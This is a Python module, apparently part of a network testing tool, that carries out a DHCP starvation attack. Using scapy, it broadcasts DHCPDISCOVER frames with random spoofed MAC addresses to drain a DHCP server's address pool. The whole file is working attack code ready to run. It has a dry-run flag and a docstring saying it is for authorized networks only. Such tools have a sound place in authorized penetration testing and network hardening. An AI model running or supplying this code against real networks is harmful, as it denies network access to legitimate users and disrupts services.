"""DHCP starvation: exhausts the server's address pool by sending
DHCPDISCOVER messages with random MAC addresses.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass

from scapy.all import BOOTP, DHCP, UDP, IP, Ether, sendp
from scapy.packet import Packet

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
CLIENT_PORT = 68
SERVER_PORT = 67


@dataclass(frozen=True)
class DhcpStarvationConfig:
    iface: str
    count: int = 0            # 0 = run until stopped
    interval: float = 0.05    # seconds between frames
    dry_run: bool = False     # build frames but do not send them


def random_mac(rng: random.Random) -> str:
    """Random unicast, locally administered MAC address (LAA bit set)."""
    octets = [rng.randrange(256) for _ in range(6)]
    octets[0] = (octets[0] & 0xFE) | 0x02
    return ":".join(f"{o:02x}" for o in octets)


def build_discover(mac: str, xid: int) -> Packet:
    """Build a complete DHCPDISCOVER for the given MAC address."""
    chaddr = bytes.fromhex(mac.replace(":", "")).ljust(16, b"\x00")
    return (
        Ether(src=mac, dst=BROADCAST_MAC)
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=CLIENT_PORT, dport=SERVER_PORT)
        / BOOTP(chaddr=chaddr, xid=xid, flags=0x8000)
        / DHCP(options=[("message-type", "discover"), "end"])
    )


def run_starvation(
    config: DhcpStarvationConfig,
    stop_event: threading.Event,
    on_progress: Callable[[int], None],
    rng: random.Random | None = None,
) -> int:
    """Send DISCOVER frames until `count` is reached or `stop_event` is set.

    Returns the number of frames generated.
    """
    rng = rng or random.Random()
    generated = 0
    while not stop_event.is_set() and (config.count == 0 or generated < config.count):
        frame = build_discover(random_mac(rng), rng.getrandbits(32))
        if not config.dry_run:
            sendp(frame, iface=config.iface, verbose=False)
        generated += 1
        on_progress(generated)
        stop_event.wait(config.interval)
    return generated
